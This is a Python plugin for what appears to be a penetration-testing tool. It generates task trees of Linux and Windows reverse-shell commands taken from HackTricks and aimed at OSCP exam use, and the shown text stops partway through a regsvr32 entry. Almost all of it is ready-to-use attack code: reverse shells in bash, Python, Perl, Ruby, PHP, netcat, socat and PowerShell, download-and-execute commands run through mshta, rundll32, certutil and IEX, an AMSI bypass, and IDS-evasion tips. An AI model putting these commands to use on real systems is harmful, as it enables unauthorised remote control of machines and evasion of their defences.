"""
Reverse shell generation and TTY upgrade plugin

Generates tasks for reverse shell creation and interactive shell upgrade including:
- Linux reverse shells (bash, python, perl, ruby, php, nc, socat, etc.)
- Windows reverse shells (powershell, nc, ncat, mshta, rundll32, etc.)
- Web-based reverse shells (php, asp, jsp, war, nodejs)
- MSFvenom payload generation (Linux, Windows, Mac, web)
- Full TTY upgrade techniques (python pty, script, socat, ssh)
- Shell obfuscation and encoding techniques

Extracted from HackTricks:
- generic-hacking/reverse-shells/linux.md
- generic-hacking/reverse-shells/windows.md
- generic-hacking/reverse-shells/msfvenom.md
- generic-hacking/reverse-shells/full-ttys.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class ReverseShellPlugin(ServicePlugin):
    """Reverse shell generation and TTY upgrade plugin"""

    @property
    def name(self) -> str:
        return "reverse-shell"

    @property
    def default_ports(self) -> List[int]:
        return []  # Not port-specific, manually triggered

    @property
    def service_names(self) -> List[str]:
        return ['reverse-shell', 'shell', 'tty-upgrade']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """This plugin is manually triggered, not auto-detected"""
        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """
        Detect if reverse shells plugin should activate based on finding.

        Args:
            finding: Finding dictionary with 'type' and 'description'
            profile: Optional TargetProfile for additional context

        Returns:
            Confidence score 0-100 (0 = don't activate, 100 = perfect match)
        """
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - RCE
        if finding_type == FindingTypes.REMOTE_CODE_EXECUTION:
            logger.info("Reverse shells activating: RCE detected")
            return 100

        # High - Command injection
        if finding_type == FindingTypes.COMMAND_INJECTION:
            return 95

        # High - RCE indicators
        rce_indicators = ['rce', 'command execution', 'code execution', 'shell']
        if any(ind in description for ind in rce_indicators):
            return 90

        # Medium - Deserialization (can lead to RCE)
        if finding_type == FindingTypes.DESERIALIZATION_VULN:
            return 75

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate reverse shell generation and upgrade task tree

        service_info should contain:
        - 'os_type': 'linux' or 'windows' (determines shell types)
        - 'shell_type': 'generate' or 'upgrade' (generate new shell vs upgrade existing)
        - 'vector': 'web', 'rce', 'file_upload' (attack vector context)
        """
        os_type = service_info.get('os_type', 'linux').lower()
        shell_type = service_info.get('shell_type', 'generate').lower()
        vector = service_info.get('vector', 'generic')

        if shell_type == 'upgrade':
            return self._get_tty_upgrade_tasks(target, os_type)
        elif os_type == 'windows':
            return self._get_windows_shell_tasks(target, vector)
        else:
            return self._get_linux_shell_tasks(target, vector)

    def _get_linux_shell_tasks(self, target: str, vector: str = 'generic') -> Dict[str, Any]:
        """Linux reverse shell generation tasks"""
        tasks = {
            'id': 'linux-reverse-shells',
            'name': f'Linux Reverse Shell Generation: {target}',
            'type': 'parent',
            'children': []
        }

        # Quick Win: Bash TCP reverse shell
        tasks['children'].append({
            'id': 'bash-tcp-shell',
            'name': 'Bash TCP Reverse Shell',
            'type': 'command',
            'metadata': {
                'command': 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1',
                'description': 'Classic bash TCP reverse shell using /dev/tcp pseudo-device',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'LINUX'],
                'flag_explanations': {
                    'bash -i': 'Interactive bash shell',
                    '>&': 'Redirect both stdout and stderr to same destination',
                    '/dev/tcp/<LHOST>/<LPORT>': 'TCP pseudo-device for network connection',
                    '0>&1': 'Redirect stdin to stdout (bidirectional I/O)'
                },
                'success_indicators': [
                    'Shell appears in listener (nc -lvnp <LPORT>)',
                    'Can execute commands and see output',
                    'pwd, whoami, id work'
                ],
                'failure_indicators': [
                    'Connection refused (listener not running)',
                    'No /dev/tcp support (bash compiled without it)',
                    'Firewall blocking outbound connections'
                ],
                'next_steps': [
                    'Upgrade to full TTY: python3 -c \'import pty; pty.spawn("/bin/bash")\'',
                    'Stabilize shell: export TERM=xterm',
                    'Check sudo -l for privilege escalation'
                ],
                'alternatives': [
                    'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" (more stable)',
                    'echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" | base64 -d | bash (obfuscated)',
                    'nc <LHOST> <LPORT> -e /bin/bash (if nc has -e flag)'
                ],
                'notes': 'Most reliable Linux reverse shell. Works on 90% of systems. Set listener: nc -lvnp 4444',
                'estimated_time': '30 seconds'
            }
        })

        # Bash UDP (firewall bypass)
        tasks['children'].append({
            'id': 'bash-udp-shell',
            'name': 'Bash UDP Reverse Shell (Firewall Bypass)',
            'type': 'command',
            'metadata': {
                'command': 'bash -i >& /dev/udp/<LHOST>/<LPORT> 0>&1',
                'description': 'UDP-based reverse shell to bypass TCP-only firewalls',
                'tags': ['OSCP:MEDIUM', 'LINUX', 'STEALTH'],
                'flag_explanations': {
                    '/dev/udp/': 'UDP pseudo-device instead of TCP',
                    '-i': 'Interactive mode'
                },
                'success_indicators': [
                    'Shell appears in UDP listener (nc -u -lvnp <LPORT>)',
                    'Commands execute successfully'
                ],
                'failure_indicators': [
                    'No connection (UDP is connectionless, harder to debug)',
                    'Listener must use -u flag for UDP'
                ],
                'next_steps': [
                    'Upgrade to TCP shell if possible (more stable)',
                    'Use for initial foothold, then switch protocols'
                ],
                'alternatives': [
                    'Try TCP shell first (more reliable)',
                    'Use encrypted shell (socat with SSL)'
                ],
                'notes': 'UDP useful when TCP egress blocked. Listener: nc -u -lvnp 4444',
                'estimated_time': '1 minute'
            }
        })

        # Python reverse shell
        tasks['children'].append({
            'id': 'python-shell',
            'name': 'Python Reverse Shell',
            'type': 'command',
            'metadata': {
                'command': 'export RHOST="<LHOST>";export RPORT=<LPORT>;python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'',
                'description': 'Python reverse shell with PTY for interactive shell',
                'tags': ['OSCP:HIGH', 'MANUAL', 'LINUX'],
                'flag_explanations': {
                    'export RHOST/RPORT': 'Set target variables for cleaner command',
                    'socket.socket()': 'Create TCP socket',
                    's.connect()': 'Connect to attacker IP:PORT',
                    'os.dup2(s.fileno(),fd)': 'Redirect stdin/stdout/stderr to socket',
                    'pty.spawn("/bin/sh")': 'Spawn interactive shell with PTY'
                },
                'success_indicators': [
                    'Shell with tab completion and arrow keys',
                    'Can run interactive programs (vi, sudo, su)',
                    'CTRL+C doesn\'t kill shell'
                ],
                'failure_indicators': [
                    'Python not installed',
                    'pty module missing',
                    'Connection refused'
                ],
                'next_steps': [
                    'Already has PTY, but stabilize: CTRL+Z, stty raw -echo; fg',
                    'Set terminal: export TERM=xterm',
                    'Resize: stty rows 38 columns 116'
                ],
                'alternatives': [
                    'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
                    'Try python3 if python2 fails',
                    'IPv6: python -c \'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));...\''
                ],
                'notes': 'Best shell if python available. Already has PTY built-in. Listener: nc -lvnp 4444',
                'estimated_time': '1 minute'
            }
        })

        # Netcat variants
        tasks['children'].append({
            'id': 'nc-shells',
            'name': 'Netcat Reverse Shells',
            'type': 'parent',
            'children': [
                {
                    'id': 'nc-e-shell',
                    'name': 'Netcat with -e flag',
                    'type': 'command',
                    'metadata': {
                        'command': 'nc -e /bin/sh <LHOST> <LPORT>',
                        'description': 'Netcat reverse shell using -e flag (if available)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'LINUX'],
                        'flag_explanations': {
                            '-e /bin/sh': 'Execute /bin/sh and redirect I/O to connection',
                            '<LHOST>': 'Attacker IP',
                            '<LPORT>': 'Attacker port'
                        },
                        'success_indicators': [
                            'Shell appears immediately',
                            'Simple and fast'
                        ],
                        'failure_indicators': [
                            'nc: invalid option -- \'e\' (nc compiled without -e)',
                            'Connection refused'
                        ],
                        'alternatives': [
                            'Use mkfifo method if -e not available',
                            'ncat -e /bin/bash <LHOST> <LPORT> (ncat usually has -e)'
                        ],
                        'notes': 'Many nc versions lack -e. Try mkfifo version next. Listener: nc -lvnp 4444',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': 'nc-mkfifo-shell',
                    'name': 'Netcat FIFO Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f',
                        'description': 'Netcat reverse shell using named pipe (works without -e flag)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'LINUX'],
                        'flag_explanations': {
                            'rm /tmp/f': 'Remove old FIFO if exists',
                            'mkfifo /tmp/f': 'Create named pipe for bidirectional I/O',
                            'cat /tmp/f': 'Read from pipe (input)',
                            '/bin/sh -i 2>&1': 'Interactive shell, redirect stderr to stdout',
                            '|nc <LHOST> <LPORT>': 'Pipe output to netcat connection',
                            '>/tmp/f': 'Write nc output back to FIFO (creates loop)'
                        },
                        'success_indicators': [
                            'Shell appears in listener',
                            'Commands execute with output',
                            'Bidirectional communication works'
                        ],
                        'failure_indicators': [
                            'Permission denied on /tmp',
                            'mkfifo not available',
                            'Pipe breaks easily (fragile shell)'
                        ],
                        'next_steps': [
                            'Upgrade to PTY immediately (shell is unstable)',
                            'Use: python3 -c \'import pty; pty.spawn("/bin/bash")\'',
                            'Stabilize with CTRL+Z method'
                        ],
                        'alternatives': [
                            'rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <LHOST> <LPORT> 1>/tmp/bkpipe',
                            'Use telnet instead: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <LHOST> <LPORT> >/tmp/f',
                            'Try bash /dev/tcp method first (more reliable)'
                        ],
                        'notes': 'Works on all Linux with nc but no -e. Fragile, upgrade immediately. Listener: nc -lvnp 4444',
                        'estimated_time': '1 minute'
                    }
                }
            ]
        })

        # Scripting language shells
        tasks['children'].append({
            'id': 'scripting-shells',
            'name': 'Scripting Language Reverse Shells',
            'type': 'parent',
            'children': [
                {
                    'id': 'perl-shell',
                    'name': 'Perl Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'perl -e \'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
                        'description': 'Perl reverse shell (common on older Linux systems)',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'LINUX'],
                        'flag_explanations': {
                            'use Socket': 'Load Perl socket library',
                            'socket(S,PF_INET,SOCK_STREAM,...)': 'Create TCP socket',
                            'connect(S,sockaddr_in(...))': 'Connect to attacker',
                            'open(STDIN,">&S")': 'Redirect stdin to socket',
                            'exec("/bin/sh -i")': 'Execute interactive shell'
                        },
                        'success_indicators': [
                            'Shell appears in listener',
                            'Commands execute normally'
                        ],
                        'failure_indicators': [
                            'Perl not installed',
                            'Socket module missing'
                        ],
                        'alternatives': [
                            'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
                            'Try python shell instead (more common)'
                        ],
                        'notes': 'Perl common on legacy systems. Listener: nc -lvnp 4444',
                        'estimated_time': '1 minute'
                    }
                },
                {
                    'id': 'ruby-shell',
                    'name': 'Ruby Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'ruby -rsocket -e\'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
                        'description': 'Ruby reverse shell for Ruby-heavy environments',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'LINUX'],
                        'flag_explanations': {
                            '-rsocket': 'Load socket library',
                            'TCPSocket.open': 'Create TCP connection',
                            '.to_i': 'Get file descriptor as integer',
                            'exec sprintf': 'Execute shell with file descriptor redirection'
                        },
                        'success_indicators': [
                            'Shell connects to listener',
                            'Ruby environment detected'
                        ],
                        'failure_indicators': [
                            'Ruby not installed',
                            'socket library missing'
                        ],
                        'alternatives': [
                            'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("<LHOST>","<LPORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
                            'Use python shell (more universal)'
                        ],
                        'notes': 'Ruby shells rare in CTFs. Use for web app exploitation. Listener: nc -lvnp 4444',
                        'estimated_time': '1 minute'
                    }
                },
                {
                    'id': 'php-shell',
                    'name': 'PHP Reverse Shell (Command Line)',
                    'type': 'command',
                    'metadata': {
                        'command': 'php -r \'$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");\'',
                        'description': 'PHP command-line reverse shell (assumes fd 3)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'LINUX', 'WEB'],
                        'flag_explanations': {
                            'php -r': 'Execute PHP code from command line',
                            'fsockopen': 'Open socket connection',
                            'exec("/bin/sh -i <&3 >&3 2>&3")': 'Execute shell with stdin/stdout/stderr to file descriptor 3'
                        },
                        'success_indicators': [
                            'Shell appears in listener',
                            'PHP command line available'
                        ],
                        'failure_indicators': [
                            'File descriptor 3 not the socket (use proc_open method)',
                            'PHP CLI not installed'
                        ],
                        'next_steps': [
                            'Use web-based PHP shell for file upload vectors',
                            'Upgrade to PTY if needed'
                        ],
                        'alternatives': [
                            'php -r \'$sock=fsockopen("<LHOST>",<LPORT>);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'',
                            'Upload PHP web shell: <?php system($_GET["cmd"]); ?>',
                            'Use pentestmonkey PHP reverse shell (reliable, full featured)'
                        ],
                        'notes': 'For RCE on web servers. See web-based shells section for file upload. Listener: nc -lvnp 4444',
                        'estimated_time': '1 minute'
                    }
                }
            ]
        })

        # Advanced/exotic shells
        tasks['children'].append({
            'id': 'advanced-shells',
            'name': 'Advanced & Exotic Shells',
            'type': 'parent',
            'children': [
                {
                    'id': 'socat-reverse',
                    'name': 'Socat Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'socat TCP4:<LHOST>:<LPORT> EXEC:bash,pty,stderr,setsid,sigint,sane',
                        'description': 'Socat reverse shell with full PTY (best quality shell)',
                        'tags': ['OSCP:HIGH', 'LINUX'],
                        'flag_explanations': {
                            'TCP4:<LHOST>:<LPORT>': 'TCP IPv4 connection to attacker',
                            'EXEC:bash': 'Execute bash shell',
                            'pty': 'Allocate pseudo-terminal (enables tab completion, arrow keys)',
                            'stderr': 'Redirect stderr',
                            'setsid': 'Create new session',
                            'sigint': 'Handle CTRL+C properly',
                            'sane': 'Terminal sanity settings'
                        },
                        'success_indicators': [
                            'Fully interactive shell immediately',
                            'Tab completion works',
                            'Arrow keys work',
                            'CTRL+C works correctly',
                            'Can run vi, top, su, sudo interactively'
                        ],
                        'failure_indicators': [
                            'socat not installed (rare)',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'Already fully upgraded, no stabilization needed',
                            'Set terminal size: stty rows 38 columns 116',
                            'Check sudo -l for privesc'
                        ],
                        'alternatives': [
                            'Attacker listener: socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>',
                            'Encrypted: socat TCP4:<LHOST>:<LPORT>,verify=0 EXEC:bash,pty,stderr,setsid,sigint,sane',
                            'Download static socat: wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat'
                        ],
                        'notes': 'Best quality shell if socat available. Listener: socat file:`tty`,raw,echo=0 tcp-listen:4444',
                        'estimated_time': '1-2 minutes'
                    }
                },
                {
                    'id': 'rustcat-shell',
                    'name': 'Rustcat (rcat) Modern Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat && chmod +x /tmp/rcat && /tmp/rcat connect -s /bin/bash <LHOST> <LPORT>',
                        'description': 'Modern netcat alternative with TLS, history, tab-completion',
                        'tags': ['OSCP:MEDIUM', 'LINUX'],
                        'flag_explanations': {
                            'curl -L': 'Download static rustcat binary',
                            'chmod +x': 'Make executable',
                            'rcat connect': 'Connect to listener',
                            '-s /bin/bash': 'Spawn bash shell'
                        },
                        'success_indicators': [
                            'Interactive shell with history',
                            'Tab completion enabled',
                            'Modern features (better than nc)'
                        ],
                        'failure_indicators': [
                            'Cannot download binary (no internet)',
                            'Firewall blocks GitHub'
                        ],
                        'next_steps': [
                            'Use --ssl flag for encrypted shell',
                            'Use --up for automatic PTY upgrade',
                            'Better than nc, but socat still best quality'
                        ],
                        'alternatives': [
                            'Attacker listener: rcat listen -ib <LPORT>',
                            'Encrypted: rcat connect --ssl -s /bin/bash <LHOST> <LPORT>',
                            'Transfer binary via other means if no curl'
                        ],
                        'notes': 'Packaged in Kali since 2024. Modern, but download required. Listener: rcat listen -ib 4444',
                        'estimated_time': '2-3 minutes'
                    }
                },
                {
                    'id': 'openssl-shell',
                    'name': 'OpenSSL Encrypted Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'openssl s_client -quiet -connect <LHOST>:<LPORT1>|/bin/bash|openssl s_client -quiet -connect <LHOST>:<LPORT2>',
                        'description': 'Encrypted reverse shell using OpenSSL (bypasses IDS/IPS)',
                        'tags': ['OSCP:MEDIUM', 'LINUX', 'STEALTH'],
                        'flag_explanations': {
                            'openssl s_client': 'OpenSSL client for TLS connections',
                            '-quiet': 'Suppress handshake messages',
                            '-connect <LHOST>:<LPORT1>': 'Connect to input listener',
                            '|/bin/bash|': 'Pipe through bash',
                            '<LHOST>:<LPORT2>': 'Output listener'
                        },
                        'success_indicators': [
                            'Encrypted shell (IDS evasion)',
                            'Two connections established',
                            'Commands encrypted in transit'
                        ],
                        'failure_indicators': [
                            'OpenSSL not installed',
                            'Certificate verification fails',
                            'Need two listeners (complex setup)'
                        ],
                        'next_steps': [
                            'Use for high-security networks with IDS',
                            'Upgrade to PTY after connection',
                            'Consider socat with SSL (simpler)'
                        ],
                        'alternatives': [
                            'Attacker setup: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes',
                            'Listener 1: openssl s_server -quiet -key key.pem -cert cert.pem -port <LPORT1>',
                            'Listener 2: openssl s_server -quiet -key key.pem -cert cert.pem -port <LPORT2>',
                            'Simpler: socat with SSL'
                        ],
                        'notes': 'Complex but bypasses IDS. Requires certificate generation. See full-ttys.md for details',
                        'estimated_time': '5 minutes (setup)'
                    }
                }
            ]
        })

        # Shell generators reference
        tasks['children'].append({
            'id': 'shell-generators',
            'name': 'Online Shell Generators',
            'type': 'manual',
            'metadata': {
                'description': 'Use online tools to generate reverse shells for any language/OS',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'REFERENCE'],
                'notes': [
                    'RECOMMENDED GENERATORS:',
                    '',
                    '1. https://www.revshells.com/',
                    '   - Most comprehensive',
                    '   - Select OS, shell type, IP, port',
                    '   - Copy-paste ready',
                    '',
                    '2. https://reverse-shell.sh/',
                    '   - Simple URL: curl https://reverse-shell.sh/IP:PORT | bash',
                    '   - Generates bash one-liner',
                    '',
                    '3. https://github.com/ShutdownRepo/shellerator',
                    '   - CLI tool: shellerator -t bash -i 10.10.10.10 -p 4444',
                    '   - Supports encoding/obfuscation',
                    '',
                    '4. https://github.com/0x00-0x00/ShellPop',
                    '   - Python tool with menu',
                    '   - Large variety of shells',
                    '',
                    '5. https://weibell.github.io/reverse-shell-generator/',
                    '   - Clean UI',
                    '   - Copy-paste friendly',
                    '',
                    'WHY USE GENERATORS:',
                    '- Pre-tested, reliable shells',
                    '- Proper escaping for web contexts',
                    '- Encoded variants for WAF bypass',
                    '- Saves time during exam',
                    '',
                    'EXAM TIP: Bookmark revshells.com before exam'
                ],
                'estimated_time': '1 minute'
            }
        })

        return tasks

    def _get_windows_shell_tasks(self, target: str, vector: str = 'generic') -> Dict[str, Any]:
        """Windows reverse shell generation tasks"""
        tasks = {
            'id': 'windows-reverse-shells',
            'name': f'Windows Reverse Shell Generation: {target}',
            'type': 'parent',
            'children': []
        }

        # Quick Win: PowerShell one-liner
        tasks['children'].append({
            'id': 'powershell-oneliner',
            'name': 'PowerShell Reverse Shell One-Liner',
            'type': 'command',
            'metadata': {
                'command': '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
                'description': 'PowerShell TCP reverse shell (most reliable Windows shell)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'WINDOWS'],
                'flag_explanations': {
                    'New-Object System.Net.Sockets.TCPClient': 'Create TCP socket',
                    '$stream = $client.GetStream()': 'Get network stream for I/O',
                    'while(($i = $stream.Read(...)) -ne 0)': 'Loop reading commands',
                    'iex $data': 'Invoke-Expression to execute commands',
                    '$stream.Write': 'Send output back to attacker'
                },
                'success_indicators': [
                    'PowerShell prompt appears: PS C:\\>',
                    'Commands execute with full PowerShell features',
                    'Can use cmdlets (Get-ChildItem, Get-Process, etc.)'
                ],
                'failure_indicators': [
                    'PowerShell execution policy blocked',
                    'AMSI blocks execution',
                    'Firewall blocks outbound connection'
                ],
                'next_steps': [
                    'Check privileges: whoami /all',
                    'Check for SeImpersonatePrivilege (Potato attacks)',
                    'Download PowerUp.ps1 for privesc enumeration',
                    'Disable AMSI if detected: [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)'
                ],
                'alternatives': [
                    'Execution policy bypass: powershell -exec bypass -c "<COMMAND>"',
                    'Download and execute: powershell -c "IEX(New-Object Net.WebClient).downloadString(\'http://<LHOST>/shell.ps1\')"',
                    'Base64 encoded (AMSI bypass): powershell -enc <BASE64>',
                    'Use Nishang Invoke-PowerShellTcp.ps1 (more features)'
                ],
                'notes': 'Most reliable Windows shell. Bypass execution policy with -exec bypass. Listener: nc -lvnp 4444',
                'estimated_time': '1 minute'
            }
        })

        # PowerShell download and execute
        tasks['children'].append({
            'id': 'powershell-download-exec',
            'name': 'PowerShell Download and Execute',
            'type': 'command',
            'metadata': {
                'command': 'powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString(\'http://<LHOST>/shell.ps1\')"',
                'description': 'Download and execute PowerShell script from web server',
                'tags': ['OSCP:HIGH', 'WINDOWS'],
                'flag_explanations': {
                    '-exec bypass': 'Bypass execution policy restrictions',
                    'IEX': 'Invoke-Expression (execute downloaded code)',
                    'New-Object Net.WebClient': 'Create HTTP client',
                    '.downloadString': 'Download script as string (in-memory execution)'
                },
                'success_indicators': [
                    'Script downloads and executes',
                    'No file written to disk (in-memory)',
                    'Shell appears if script is reverse shell'
                ],
                'failure_indicators': [
                    'AMSI blocks download',
                    'Cannot reach web server',
                    'Proxy blocks connection'
                ],
                'next_steps': [
                    'Use Nishang Invoke-PowerShellTcp.ps1',
                    'Use PowerCat for advanced features',
                    'Consider encoding for AMSI bypass'
                ],
                'alternatives': [
                    'Proxy-aware: powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(\'http://<LHOST>/shell.ps1\')|iex"',
                    'Nishang: Add to end of Invoke-PowerShellTcp.ps1: Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>',
                    'WebDAV: powershell -exec bypass -f \\\\<LHOST>\\share\\payload.ps1'
                ],
                'notes': 'Requires web server: python3 -m http.server 80. Not detected by Defender (as of 2019). Listener: nc -lvnp 4444',
                'estimated_time': '2 minutes'
            }
        })

        # Netcat Windows
        tasks['children'].append({
            'id': 'nc-windows',
            'name': 'Netcat Windows Reverse Shell',
            'type': 'command',
            'metadata': {
                'command': 'nc.exe -e cmd.exe <LHOST> <LPORT>',
                'description': 'Classic Windows netcat reverse shell',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'WINDOWS', 'MANUAL'],
                'flag_explanations': {
                    'nc.exe': 'Netcat for Windows',
                    '-e cmd.exe': 'Execute cmd.exe and redirect I/O',
                    '<LHOST>': 'Attacker IP',
                    '<LPORT>': 'Attacker port'
                },
                'success_indicators': [
                    'cmd.exe prompt appears',
                    'Simple and fast connection'
                ],
                'failure_indicators': [
                    'nc.exe not present (need to upload)',
                    'Windows Defender blocks nc.exe'
                ],
                'next_steps': [
                    'Upgrade to PowerShell: powershell',
                    'Check privileges: whoami /all',
                    'Upload nc.exe if not present'
                ],
                'alternatives': [
                    'ncat.exe <LHOST> <LPORT> -e "cmd.exe /c (cmd.exe 2>&1)"',
                    'ncat.exe --ssl <LHOST> <LPORT> -e cmd.exe (encrypted)',
                    'Download nc.exe: certutil -urlcache -split -f http://<LHOST>/nc.exe nc.exe'
                ],
                'notes': 'nc.exe often missing, need to upload. Use ncat with --ssl for encryption. Listener: nc -lvnp 4444',
                'estimated_time': '1 minute'
            }
        })

        # LOLBAS techniques
        tasks['children'].append({
            'id': 'lolbas-shells',
            'name': 'LOLBAS Windows Reverse Shells',
            'type': 'parent',
            'children': [
                {
                    'id': 'mshta-shell',
                    'name': 'MSHTA Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'mshta http://<LHOST>/payload.hta',
                        'description': 'Execute HTA file for reverse shell (LOLBAS technique)',
                        'tags': ['OSCP:MEDIUM', 'WINDOWS', 'LOLBAS'],
                        'flag_explanations': {
                            'mshta': 'Microsoft HTML Application host (LOLBAS binary)',
                            'http://<LHOST>/payload.hta': 'Remote HTA file URL'
                        },
                        'success_indicators': [
                            'HTA executes from remote server',
                            'Shell callback received',
                            'Signed binary (LOLBAS) bypasses some security'
                        ],
                        'failure_indicators': [
                            'Cannot reach web server',
                            'HTA blocked by antivirus',
                            'Application whitelisting blocks mshta'
                        ],
                        'next_steps': [
                            'Create HTA with PowerShell payload',
                            'Use Metasploit: use exploit/windows/misc/hta_server',
                            'Try other LOLBAS binaries if blocked'
                        ],
                        'alternatives': [
                            'Local HTA: mshta C:\\temp\\payload.hta',
                            'WebDAV: mshta \\\\<LHOST>\\share\\payload.hta',
                            'VBScript: mshta vbscript:Close(Execute("GetObject(""script:http://<LHOST>/payload.sct"")"))',
                            'Metasploit: use exploit/windows/misc/hta_server'
                        ],
                        'notes': 'HTA example: <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass IEX(New-ObjEct Net.Webclient).DownloadString(\'http://<LHOST>/shell.ps1\')"</scRipt>',
                        'estimated_time': '2-3 minutes'
                    }
                },
                {
                    'id': 'rundll32-shell',
                    'name': 'Rundll32 JavaScript Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";o=GetObject("script:http://<LHOST>/payload.sct");window.close();',
                        'description': 'Execute JavaScript/SCT file via rundll32 (LOLBAS)',
                        'tags': ['OSCP:MEDIUM', 'WINDOWS', 'LOLBAS'],
                        'flag_explanations': {
                            'rundll32.exe': 'Windows utility to run DLL functions (LOLBAS)',
                            'javascript:"\\..\\mshtml,RunHTMLApplication"': 'Invoke JavaScript via mshtml',
                            'GetObject("script:...")': 'Load and execute remote SCT scriptlet'
                        },
                        'success_indicators': [
                            'SCT file downloads and executes',
                            'Reverse shell callback',
                            'Signed binary evades some detection'
                        ],
                        'failure_indicators': [
                            'Defender blocks (often detected)',
                            'Cannot reach web server',
                            'Script execution disabled'
                        ],
                        'next_steps': [
                            'Create SCT file with JScript payload',
                            'Try regsvr32 (similar LOLBAS technique)',
                            'Use Metasploit: use windows/smb/smb_delivery'
                        ],
                        'alternatives': [
                            'WebDAV: rundll32 \\\\<LHOST>\\share\\payload.dll,entrypoint',
                            'Metasploit: use windows/smb/smb_delivery (gives command)',
                            'Koadic: use stager/js/rundll32_js'
                        ],
                        'notes': 'Often detected by Defender. SCT format: <?XML version="1.0"?><scriptlet><script language="JScript"><![CDATA[var r = new ActiveXObject("WScript.Shell").Run("calc.exe");]]></script></scriptlet>',
                        'estimated_time': '3-5 minutes'
                    }
                },
                {
                    'id': 'regsvr32-shell',
                    'name': 'Regsvr32 SCT Reverse Shell',
                    'type': 'command',
                    'metadata': {
                        'command': 'regsvr32 /u /n /s /i:http://<LHOST>/payload.sct scrobj.dll',
                        'description': 'Execute SCT scriptlet via regsvr32 (LOLBAS)',
                        'tags': ['OSCP:MEDIUM', 'WINDOWS', 'LOLBAS'],
                        'flag_explanations': {
                            'regsvr32': 'Register/unregister DLL and ActiveX controls (LOLBAS)',
                            '/u': 'Unregister server',
                            '/n': 'Do not call DllRegisterServer',
                            '/s': 'Silent mode (no message boxes)',
